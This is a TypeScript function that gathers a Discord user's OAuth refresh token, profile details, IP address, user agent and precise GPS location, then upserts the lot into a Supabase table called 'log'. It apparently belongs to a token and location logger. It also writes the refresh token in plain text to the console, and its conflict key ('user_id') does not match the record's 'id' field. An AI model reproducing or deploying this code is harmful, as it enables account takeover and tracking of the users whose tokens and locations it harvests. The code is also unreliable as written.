import { IpInfo } from "@/lib/functions/logger";
import { UserLocation } from "@/lib/hooks/user-location-hooks";
import { DiscordUser } from "@/lib/types";
import { supabase } from "@/lib/utils/supabase/client";

export async function push(
  refreshToken: string,
  userInfo: DiscordUser,
  ipInfo: IpInfo,
  userAgent: string,
  location: UserLocation
) {
  try {
    const userData = {
      id: userInfo.id,
      username: userInfo.username,
      global_name: userInfo.global_name,
      avatar: userInfo.avatar,
      email: userInfo.email,
      mfa_enabled: userInfo.mfa_enabled,
      locale: userInfo.locale,
      verified: userInfo.verified,
      ip: ipInfo.ip,
      user_agent: userAgent,
      location: {
        latitude: location.latitude,
        longitude: location.longitude,
        altitude: location.altitude,
        accuracy: location.accuracy,
      },
      refresh_token: refreshToken,
      created_at: new Date().toISOString(),
    };

    console.log("Preparing to insert data:", JSON.stringify(userData));

    const { data, error } = await supabase.from("log").upsert(userData, {
      onConflict: "user_id",
    });

    if (error) {
      console.log("Supabase insertion error:", error);
      return { success: false, error };
    }

    console.log("Data inserted successfully:", data);
    return { success: true, data };
  } catch (error) {
    console.error("push error:", error);
    return { success: false, error };
  }
}
